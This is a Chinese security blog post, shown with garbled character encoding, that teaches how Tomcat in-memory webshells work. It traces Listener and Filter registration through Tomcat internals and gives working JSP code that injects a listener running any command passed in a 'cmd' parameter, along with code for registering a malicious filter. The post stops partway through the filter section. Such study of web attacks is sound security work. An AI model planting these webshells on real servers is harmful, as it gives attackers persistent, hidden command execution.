<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Tomcatå‹å†…å­˜ğŸ | Bloyet&#39;s blog</title>
<link rel="shortcut icon" href="https://bloyet.github.io/favicon.ico?v=1752383988636">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://bloyet.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="Tomcatå‹å†…å­˜ğŸ | Bloyet&#39;s blog - Atom Feed" href="https://bloyet.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="å‚è€ƒæ–‡çŒ®ï¼š
Tomcatå†…å­˜é©¬
Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog
Tomcatä¸­çš„ä¸‰ç§Context
æ ¹æ®Tomcatçš„ä¸‰å¤§ä»¶servletã€linstenerã€filteræ³¨å…¥å†…å­˜é©¬ï¼ŒServletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://bloyet.github.io">
  <img class="avatar" src="https://bloyet.github.io/images/avatar.png?v=1752383988636" alt="">
  </a>
  <h1 class="site-title">
    Bloyet&#39;s blog
  </h1>
  <p class="site-description">
    åšé‚£ä¸ªäººçš„æˆ˜å£«ï¼Œå’Œä»–ä¸€èµ·å»ç»å†ï¼Œå¤±è´¥!
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          Home
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/friends" class="menu">
          Friends
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              Tomcatå‹å†…å­˜ğŸ
            </h2>
            <div class="post-info">
              <span>
                2025-07-11
              </span>
              <span>
                25 min read
              </span>
              
            </div>
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <p>å‚è€ƒæ–‡çŒ®ï¼š</p>
<p><a href="https://yyjccc.github.io/2024/03/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcatå†…å­˜é©¬</a></p>
<p><a href="https://goodapple.top/archives/1355">Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog</a></p>
<h1 id="tomcatä¸­çš„ä¸‰ç§context">Tomcatä¸­çš„ä¸‰ç§Context</h1>
<p>æ ¹æ®Tomcatçš„ä¸‰å¤§ä»¶servletã€linstenerã€filteræ³¨å…¥å†…å­˜é©¬ï¼ŒServletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ³¨å†Œç»„ä»¶ã€‚è€ŒTomcatç›´åˆ°7.xæ‰æ”¯æŒServlet3.0ï¼Œå› æ­¤é€šè¿‡åŠ¨æ€æ·»åŠ æ¶æ„ç»„ä»¶æ³¨å…¥å†…å­˜é©¬çš„æ–¹å¼é€‚åˆTomcat7.xåŠä»¥ä¸Š</p>
<p>å…ˆå¯¼å…¥ä¾èµ–ï¼š</p>
<pre><code class="language-java">&lt;dependency&gt;
&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
&lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
&lt;version&gt;8.5.31&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<h2 id="servletcontext">ServletContext</h2>
<p>åœ¨Tomcatæ¶æ„åˆ†æçš„æ—¶å€™ï¼Œä¹Ÿæåˆ°è¿‡è¿™ä¸ªï¼š</p>
<p>Servletè§„èŒƒä¸­è§„å®šäº†ä¸€ä¸ªServletContextæ¥å£ï¼Œå…¶ç”¨æ¥ä¿å­˜ä¸€ä¸ªWebåº”ç”¨ä¸­æ‰€æœ‰Servletçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ServletContextæ¥å¯¹æŸä¸ªWebåº”ç”¨çš„èµ„æºè¿›è¡Œè®¿é—®å’Œæ“ä½œ</p>
<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1752213966680.png" alt="" loading="lazy"></figure>
<h2 id="applicationcontext">ApplicationContext</h2>
<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1752213966694.png" alt="" loading="lazy"></figure>
<p>ä½¿ç”¨getServletContext()æ–¹æ³•å…¶å®æ˜¯è·å–åˆ°äº†ApplicationContextFacadeç±»ï¼Œä½†æ˜¯å…¶å®æœ¬è´¨ä¸Šè¿˜æ˜¯è°ƒç”¨äº†ApplicationContextç±»ä¸­çš„æ–¹æ³•</p>
<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1752213966709.png" alt="" loading="lazy"></figure>
<h2 id="standardcontext">StandardContext</h2>
<p>å®ƒæ˜¯contextå®¹å™¨çš„æ ‡å‡†å®ç°ç±»ï¼ŒåŒ…å«äº†å¯¹å®¹å™¨èµ„æºçš„å„ç§æ“ä½œï¼ŒApplicationContextæœ¬è´¨ä¸Šæ˜¯è°ƒç”¨äº†StandardContext</p>
<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1752213966724.png" alt="" loading="lazy"></figure>
<p>ä¸€å¼ å›¾æ¥æ€»ç»“å…¶ä¸­çš„å…³ç³»ï¼š</p>
<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1752213966740.jpeg" alt="" loading="lazy"></figure>
<h1 id="tomcatå†…å­˜é©¬">Tomcatå†…å­˜é©¬</h1>
<p>Tomcatå†…å­˜é©¬å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯Listenerå‹ã€Filterå‹ã€Servletå‹ã€‚å¯èƒ½æœ‰äº›æœ‹å‹ä¼šå‘ç°ï¼Œè¿™ä¸æ­£æ˜¯Java Webæ ¸å¿ƒçš„ä¸‰å¤§ç»„ä»¶å˜›ï¼æ²¡é”™ï¼ŒTomcatå†…å­˜é©¬çš„æ ¸å¿ƒåŸç†å°±æ˜¯åŠ¨æ€åœ°å°†æ¶æ„ç»„ä»¶æ·»åŠ åˆ°æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­ã€‚</p>
<p>åœ¨è¿™å°±ä¸€æ­¥ä¸€æ­¥çš„æ¥åˆ†æï¼š</p>
<p>å¼•å…¥Tomcatä¾èµ–â€”è¿™ä¸ªæˆ‘åœ¨ä¸€å¼€å§‹å°±å·²ç»å¼•å…¥äº†</p>
<h2 id="listenerå‹">Listenerå‹</h2>
<p>Listeneræ ¹æ®äº‹ä»¶å¯ä»¥åˆ†ä¸º3ä¸­ServletContextListenerï¼ŒHttpSessionListenerï¼ŒServletRequestListener</p>
<p>å¾ˆæ˜æ˜¾ï¼ŒServletRequestListenerç±»å‹çš„æ˜¯æœ€é€‚åˆç”¨æ¥åšå†…å­˜é©¬çš„ï¼Œå½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºæ—¶ï¼Œéƒ½ä¼šè§¦å‘<code>ServletRequestListener#requestInitialized()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¿™ä¸ªæ–¹æ³•ä¸­å†™å…¥æ¶æ„å‘½ä»¤å°±å¯ä»¥è¾¾åˆ°æ”»å‡»æ‰‹æ®µäº†</p>
<p>ä¾‹å­ï¼š</p>
<pre><code class="language-java">package Listener;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import java.io.IOException;

@WebListener
public class Hello_Listener implements ServletRequestListener {


    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        try {
            Runtime.getRuntime().exec(&quot;calc&quot;);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (NullPointerException n) {
            n.printStackTrace();
        }
    }
}
</code></pre>
<p>è®¿é—®ä»»æ„è·¯ç”±éƒ½ä¼šè§¦å‘å‘½ä»¤</p>
<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1752213966755.png" alt="" loading="lazy"></figure>
<p>æˆ‘ä»¬åˆšåˆšåªæ˜¯æ¼”ç¤ºäº†ä¸€ä¸‹ Listenerä¸­çš„requestInitialized() ä¼šåœ¨æˆ‘ä»¬è®¿é—®è·¯ç”±çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸å¯èƒ½å¯ä»¥ç›´æ¥å»ä¿®æ”¹è¿™ä¸ªæ–¹æ³•ï¼Œé‚£åº”è¯¥æ€ä¹ˆåŠ¨æ€çš„å†™å…¥æ¶æ„çš„listenerå‘¢ï¼Ÿ</p>
<h3 id="listeneræ³¨å†Œè¿‡ç¨‹">Listeneræ³¨å†Œè¿‡ç¨‹</h3>
<p>æ–­ç‚¹å°±æ‰“åœ¨requestInitialized()æ–¹æ³•ä¸Šï¼Œæˆ‘ä»¬çœ‹çœ‹åœ¨è¿™ä¹‹å‰éƒ½è°ƒç”¨äº†ä»€ä¹ˆéšè—å¸§ï¼Œå¼€å§‹å›æº¯å¯»æ‰¾è°ƒç”¨è¿‡ç¨‹</p>
<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1752213966772.png" alt="" loading="lazy"></figure>
<p>å…ˆæ¥çœ‹StandarContext#fireRequestInitEventæ–¹æ³•</p>
<pre><code class="language-java">public boolean fireRequestInitEvent(ServletRequest request) {
Object[] instances = this.getApplicationEventListeners();
if (instances != null &amp;&amp; instances.length &gt; 0) {
    ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request);

    for(int i = 0; i &lt; instances.length; ++i) {
        if (instances[i] != null &amp;&amp; instances[i] instanceof ServletRequestListener) {
            ServletRequestListener listener = (ServletRequestListener)instances[i];

            try {
                listener.requestInitialized(event);
            } catch (Throwable var7) {
                Throwable t = var7;
                ExceptionUtils.handleThrowable(t);
                this.getLogger().error(sm.getString(&quot;standardContext.requestListener.requestInit&quot;, new Object[]{instances[i].getClass().getName()}), t);
                request.setAttribute(&quot;javax.servlet.error.exception&quot;, t);
                return false;
            }
        }
    }
}

return true;
}
</code></pre>
<p>å…ˆæ˜¯è°ƒç”¨getApplicationEventListeners()è·å–åˆ°ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åéå†æ•°ç»„è°ƒç”¨listener.requestInitialized(event);æ–¹æ³•è§¦å‘Litenerï¼Œå…ˆæ­¥å…¥</p>
<p>getApplicationEventListeners()æ–¹æ³•</p>
<pre><code class="language-java">public Object[] getApplicationEventListeners() {
    return applicationEventListenersList.toArray();
}
</code></pre>
<p>å‘ç°ä¿¡æ¯æ˜¯å‚¨å­˜åœ¨applicationEventListenersListä¸­çš„ï¼š</p>
<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1752213966786.png" alt="" loading="lazy"></figure>
<p>è€Œä¸”æˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡StandardContext#addApplicationEventListener()æ–¹æ³•æ¥æ·»åŠ Listener</p>
<pre><code class="language-java">public void addApplicationEventListener(Object listener) {
this.applicationEventListenersList.add(listener);
}
</code></pre>
<h3 id="æ³¨å…¥listener">æ³¨å…¥Listener</h3>
<p>åœ¨å¾€ä¸Šçœ‹ä¸€å¸§</p>
<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1752213966801.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1752213966816.png" alt="" loading="lazy"></figure>
<p>å‘ç°åœ¨è¿™æ‰§è¡Œäº†invokeæ–¹æ³• è·å–åˆ°äº†StandardContextçš„å®ä¾‹</p>
<p>ç¬¬äºŒç§æ–¹æ³•è·å–ï¼š</p>
<p>ç”±äºJSPå†…ç½®äº†requestå¯¹è±¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨åŒæ ·çš„æ–¹å¼æ¥è·å–</p>
<pre><code class="language-java">&lt;%
Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
//è¿™é‡Œçš„Requestä¸ºorg.apache.catalina.connector.Request
StandardContext context = (StandardContext) req.getContext();
%&gt;
</code></pre>
<p>ç¬¬ä¸‰ç§ï¼š</p>
<pre><code class="language-java">&lt;%
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
%&gt;
</code></pre>
<p>è¿™é‡Œå°±ç”¨ç¬¬äºŒç§æ¥è¿›è¡Œæ³¨å…¥ï¼š</p>
<p>è¿™é‡Œå…ˆä½¿ç”¨jspæ–‡ä»¶è¿›è¡Œæ³¨å…¥ï¼Œåé¢è¿˜ä¼šè¯´å®æˆ˜æ€ä¹ˆé€šè¿‡ååºåˆ—åŒ–æ¥åŠ è½½</p>
<pre><code class="language-java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
 
&lt;%!
    public class Shell_Listener implements ServletRequestListener {
 
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
           String cmd = request.getParameter(&quot;cmd&quot;);
           if (cmd != null) {
               try {
                   Runtime.getRuntime().exec(cmd);
               } catch (IOException e) {
                   e.printStackTrace();
               } catch (NullPointerException n) {
                   n.printStackTrace();
               }
            }
        }
 
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
%&gt;
&lt;%
    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
 
    Shell_Listener shell_Listener = new Shell_Listener();
    context.addApplicationEventListener(shell_Listener);
%&gt;
</code></pre>
<p>å…ˆè®¿é—®ä¸€ä¸‹jspæ–‡ä»¶ è¿™æ ·å°±ä¼šæŠŠæˆ‘ä»¬çš„æ¶æ„Listeneræ³¨å…¥äº†ï¼ˆè®¿é—®è¿™ä¸ªjspæ–‡ä»¶ä¹‹åï¼Œä¼šæ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼Œæˆ‘ä»¬å…ˆæ˜¯è·å–åˆ°äº†contextä¸Šä¸‹æ–‡ï¼Œç„¶åæŠŠæˆ‘ä»¬çš„æ¶æ„ç±»æ·»åŠ åˆ°ä¸Šä¸‹æ–‡ä¸­ï¼Œç„¶ååœ¨è‡ªåŠ¨çš„è°ƒç”¨æˆ‘ä»¬çš„æ¶æ„æ–¹æ³•ï¼‰</p>
<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1752213966833.png" alt="" loading="lazy"></figure>
<h2 id="filterå‹">Filterå‹</h2>
<h3 id="filterè°ƒç”¨åˆ†æ">Filterè°ƒç”¨åˆ†æ</h3>
<p>è°ƒç”¨æ ˆå¦‚ä¸‹ï¼šæ³¨æ„çš„æ˜¯ åœ¨æˆ‘ä»¬ç»™doFilteræ–¹æ³•æ‰“ä¸Šæ–­ç‚¹ä¹‹åï¼Œå·²è°ƒè¯•çš„æ¨¡å¼å»è¿è¡ŒæœåŠ¡å™¨ï¼Œè¿˜éœ€è¦å»è®¿é—®ä¸€ä¸‹èµ„æºï¼Œåœ¨è®¿é—®çš„è¿‡ç¨‹ä¸­ä¼šè§¦å‘Filter</p>
<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1752213966847.png" alt="" loading="lazy"></figure>
<p>è¿˜æ˜¯ä¸€æ ·å…ˆçœ‹è°ƒç”¨æ ˆ</p>
<p>ApplicationFilterChain#internalDoFilter</p>
<pre><code class="language-java">private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException {
    if (this.pos &lt; this.n) {
        ApplicationFilterConfig filterConfig = this.filters[this.pos++];

        try {
            Filter filter = filterConfig.getFilter();
            if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(filterConfig.getFilterDef().getAsyncSupported())) {
                request.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, Boolean.FALSE);
            }

            if (Globals.IS_SECURITY_ENABLED) {
                ServletRequest req = request;
                ServletResponse res = response;
                Principal principal = ((HttpServletRequest)req).getUserPrincipal();
                Object[] args = new Object[]{req, res, this};
                SecurityUtil.doAsPrivilege(&quot;doFilter&quot;, filter, classType, args, principal);
            } else {
                filter.doFilter(request, response, this);
            }

        } catch (ServletException | RuntimeException | IOException var15) {
            Exception e = var15;
            throw e;
        } catch (Throwable var16) {
            Throwable e = var16;
            e = ExceptionUtils.unwrapInvocationTargetException(e);
            ExceptionUtils.handleThrowable(e);
            throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);
        }
    } else {
        try {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set(request);
                lastServicedResponse.set(response);
            }

            if (request.isAsyncSupported() &amp;&amp; !this.servletSupportsAsync) {
                request.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, Boolean.FALSE);
            }

            if (request instanceof HttpServletRequest &amp;&amp; response instanceof HttpServletResponse &amp;&amp; Globals.IS_SECURITY_ENABLED) {
                ServletRequest req = request;
                ServletResponse res = response;
                Principal principal = ((HttpServletRequest)req).getUserPrincipal();
                Object[] args = new Object[]{req, res};
                SecurityUtil.doAsPrivilege(&quot;service&quot;, this.servlet, classTypeUsedInService, args, principal);
            } else {
                this.servlet.service(request, response);
            }
        } catch (ServletException | RuntimeException | IOException var17) {
            Exception e = var17;
            throw e;
        } catch (Throwable var18) {
            Throwable e = var18;
            e = ExceptionUtils.unwrapInvocationTargetException(e);
            ExceptionUtils.handleThrowable(e);
            throw new ServletException(sm.getString(&quot;filterChain.servlet&quot;), e);
        } finally {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set((Object)null);
                lastServicedResponse.set((Object)null);
            }

        }

    }
}
</code></pre>
<p>åœ¨è¿™é‡Œç¨å¾®äº†è§£ä¸€ä¸‹filterConfig</p>
<p>ä¸€ä¸ªfilterConfigå¯¹åº”ä¸€ä¸ªFilterï¼Œç”¨äºå­˜å‚¨Filterçš„ä¸Šä¸‹æ–‡ä¿¡æ¯</p>
<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1752213966862.png" alt="" loading="lazy"></figure>
<p>å†å»çœ‹çœ‹filtersæ˜¯æ€ä¹ˆæ¥çš„</p>
<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1752213966878.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œçš„<code>filters</code>å±æ€§æ˜¯ä¸€ä¸ªApplicationFilterConfigæ•°ç»„ã€‚ æˆ‘ä»¬ç›´æ¥å»è¿™ä¸ªæ•°ç»„é‡Œæ€ä¹ˆå‚¨å­˜Filterçš„ï¼Œå¾ˆéš¾æ‰¾åˆ°ï¼ˆè¿™é‡Œå…¶å®æ˜¯æœ‰ç‚¹éš¾ç†è§£çš„ï¼Œå…ˆè·Ÿç€å¤§ä½¬æ–‡ç« çœ‹å§ï¼‰æˆ‘è¿™é‡Œçš„åˆæ­¥ç†è§£æ˜¯å› ä¸ºè°ƒç”¨çš„ApplicationFilterChainæ‰€ä»¥è¦æ‰¾åˆ°ApplicationFilterChainçš„Filterï¼Œæˆ‘ä»¬å°±ç»§ç»­å¾€ä¸Šçœ‹è°ƒç”¨å¸§</p>
<p>StandardWrapperValve#invokeæ–¹æ³•ä¸­</p>
<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1752213966894.png" alt="" loading="lazy"></figure>
<p>çœ‹çœ‹å®ƒæ˜¯æ€ä¹ˆæ¥çš„ï¼š</p>
<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1752213966910.png" alt="" loading="lazy"></figure>
<p>æ­¥å…¥ApplicationFilterFactory.createFilterChainæ–¹æ³•ï¼š</p>
<pre><code class="language-java">public static ApplicationFilterChain createFilterChain(ServletRequest request,
            Wrapper wrapper, Servlet servlet) {
 
        ...
        // Request dispatcher in use
        filterChain = new ApplicationFilterChain();
 
        filterChain.setServlet(servlet);
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
 
        // Acquire the filter mappings for this Context
        StandardContext context = (StandardContext) wrapper.getParent();
        FilterMap filterMaps[] = context.findFilterMaps();
 
        ...
 
        String servletName = wrapper.getName();
 
        // Add the relevant path-mapped filters to this filter chain
        for (FilterMap filterMap : filterMaps) {
            
            ...
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName());
            ...
 
            filterChain.addFilter(filterConfig);
        }
 
        ...
 
        // Return the completed filter chain
        return filterChain;
    }
</code></pre>
<p>åªçœ‹å…¶ä¸­å…³é”®ä»£ç ï¼š</p>
<pre><code class="language-java">é¦–å…ˆé€šè¿‡filterChain = new ApplicationFilterChain()åˆ›å»ºä¸€ä¸ªç©ºçš„filterChainå¯¹è±¡
ç„¶åé€šè¿‡wrapper.getParent()å‡½æ•°æ¥è·å–StandardContextå¯¹è±¡
æ¥ç€è·å–StandardContextä¸­çš„FilterMapså¯¹è±¡ï¼ŒFilterMapså¯¹è±¡ä¸­å­˜å‚¨çš„æ˜¯å„Filterçš„åç§°è·¯å¾„ç­‰ä¿¡æ¯
æœ€åæ ¹æ®Filterçš„åç§°ï¼Œåœ¨StandardContextä¸­è·å–FilterConfig
é€šè¿‡filterChain.addFilter(filterConfig)å°†ä¸€ä¸ªfilterConfigæ·»åŠ åˆ°filterChainä¸­
</code></pre>
<p>è¿™æ˜¯ä¸€å¥—å®Œæ•´çš„è°ƒç”¨é€»è¾‘äº†ï¼Œä½†æ˜¯æˆ‘ä»¬åº”è¯¥æ€ä¹ˆæŠŠæ¶æ„çš„Filteræ³¨å…¥å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬çœ‹åˆ°åˆšåˆšåˆ†æçš„æ—¶å€™ï¼Œæ˜¯åœ¨æœ€åçš„æ—¶å€™æŠŠfilterå–å‡ºæ¥è¿›è¡Œè°ƒç”¨ï¼Œåœ¨è¿™ä¹‹å‰éƒ½æ˜¯å°è£…åœ¨filterConfigä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€å¼€å§‹ä¹Ÿæ˜¯å¿…é¡»å¾—æŠŠæ¶æ„çš„filteræ”¾å…¥filterConfigä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ¥çœ‹çœ‹å®ƒå…¶ä¸­çš„æ ¼å¼ï¼ˆè¿™é‡Œç›´æ¥çœ‹ä½¬çš„ï¼Œä¸æµªè´¹æ—¶é—´æ‰¾äº†ï¼‰ï¼š</p>
<h3 id="filteræ³¨å†Œåˆ†æ">Filteræ³¨å†Œåˆ†æ</h3>
<h4 id="standardcontext-2">StandardContext</h4>
<p>æˆ‘ä»¬èƒ½çœ‹åˆ°æ­¤æ—¶çš„ä¸Šä¸‹æ–‡å¯¹è±¡<code>StandardContext</code>å®é™…ä¸Šæ˜¯åŒ…å«äº†è¿™ä¸‰è€…çš„ï¼š</p>
<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1752213966925.png" alt="" loading="lazy"></figure>
<h4 id="filterconfigs">filterConfigsï¼š</h4>
<p>å…¶ä¸­filterConfigsåŒ…å«äº†å½“å‰çš„ä¸Šä¸‹æ–‡ä¿¡æ¯<code>StandardContext</code>ã€ä»¥åŠ<code>filterDef</code>ç­‰ä¿¡æ¯</p>
<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1752213966942.png" alt="" loading="lazy"></figure>
<h4 id="filterdef">filterDefï¼š</h4>
<p>å­˜æ”¾äº†filterçš„å®šä¹‰ï¼ŒåŒ…æ‹¬filterClassã€filterNameç­‰ä¿¡æ¯</p>
<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1752213966957.png" alt="" loading="lazy"></figure>
<h4 id="filterdefs">filterDefs</h4>
<p>æ˜¯ä¸€ä¸ªHashMapï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨<code>filterDef</code></p>
<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1752213966988.png" alt="" loading="lazy"></figure>
<h4 id="filtermaps">filterMaps</h4>
<p>ä»¥arrayçš„å½¢å¼å­˜æ”¾å„filterçš„è·¯å¾„æ˜ å°„ä¿¡æ¯</p>
<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1752213966972.png" alt="" loading="lazy"></figure>
<p>å¿…è¦å±æ€§ï¼š<code>dispatcherMapping</code>ã€<code>filterName</code>ã€<code>urlPatterns</code></p>
<h3 id="æ³¨å†Œfilteræ€è·¯">æ³¨å†ŒFilteræ€è·¯</h3>
<ol>
<li>è·å–StandardContextå¯¹è±¡</li>
<li>åˆ›å»ºæ¶æ„Filter</li>
<li>ä½¿ç”¨FilterDefå¯¹Filterè¿›è¡Œå°è£…ï¼Œå¹¶æ·»åŠ å¿…è¦çš„å±æ€§</li>
<li>åˆ›å»ºfilterMapç±»ï¼Œå¹¶å°†è·¯å¾„å’ŒFilternameç»‘å®šï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterMapsä¸­</li>
<li>ä½¿ç”¨ApplicationFilterConfigå°è£…filterDefï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterConfigsä¸­</li>
</ol>
<h4 id="è·å–standardcontextå¯¹è±¡">è·å–StandardContextå¯¹è±¡</h4>
<p>StandardContextå¯¹è±¡ä¸»è¦ç”¨æ¥ç®¡ç†Webåº”ç”¨çš„ä¸€äº›å…¨å±€èµ„æºï¼Œå¦‚Sessionã€Cookieã€Servletç­‰ã€‚å› æ­¤æˆ‘ä»¬æœ‰å¾ˆå¤šæ–¹æ³•æ¥è·å–StandardContextå¯¹è±¡ã€‚</p>
<p>Tomcatåœ¨å¯åŠ¨æ—¶ä¼šä¸ºæ¯ä¸ªContextéƒ½åˆ›å»ºä¸ªServletContextå¯¹è±¡ï¼Œæ¥è¡¨ç¤ºä¸€ä¸ªContextï¼Œä»è€Œå¯ä»¥å°†ServletContextè½¬åŒ–ä¸ºStandardContextã€‚</p>
<pre><code class="language-java">//è·å–ApplicationContextFacadeç±»
ServletContext servletContext = request.getSession().getServletContext();
 
//åå°„è·å–ApplicationContextFacadeç±»å±æ€§contextä¸ºApplicationContextç±»
Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
 
//åå°„è·å–ApplicationContextç±»å±æ€§contextä¸ºStandardContextç±»
Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
</code></pre>
<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1752213967003.png" alt="" loading="lazy"></figure>
<h4 id="1-åˆ›å»ºæ¶æ„filter">1. åˆ›å»ºæ¶æ„Filter</h4>
<pre><code class="language-java">public class CmdFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println(&quot;Filter åˆå§‹æ„é€ å®Œæˆ&quot;);
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        Runtime.getRuntime().exec(&quot;calc&quot;);
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println(&quot;filter é”€æ¯&quot;);
    }
}
</code></pre>
<h4 id="filterdefå¯¹filterè¿›è¡Œå°è£…">FilterDefå¯¹Filterè¿›è¡Œå°è£…</h4>
<pre><code class="language-java">String name=&quot;filterShell&quot;;
FilterDef filterDef = new FilterDef();
filterDef.setFilter(new CmdFilter());
filterDef.setFilterClass(CmdFilter.class.getName());
filterDef.setFilterName(name);
context.addFilterDef(filterDef);
</code></pre>
<h4 id="åˆ›å»ºfiltermapç±»">åˆ›å»ºfilterMapç±»</h4>
<pre><code class="language-java">FilterMap filterMap = new FilterMap();
	filterMap.setFilterName(name);
	filterMap.setDispatcher(DispatcherType.REQUEST.name());
	filterMap.addURLPattern(&quot;/*&quot;);
	context.addFilterMap(filterMap);
</code></pre>
<h4 id="æ³¨å…¥åˆ°filterconfigsä¸­">æ³¨å…¥åˆ°filterConfigsä¸­</h4>
<p>è¿™é‡Œå› ä¸ºApplicationFilterConfigçš„æ„é€ æ–¹æ³•ä¸æ˜¯å…¬å…±çš„ï¼Œéœ€è¦åå°„æ¥è¿›è¡Œè°ƒç”¨</p>
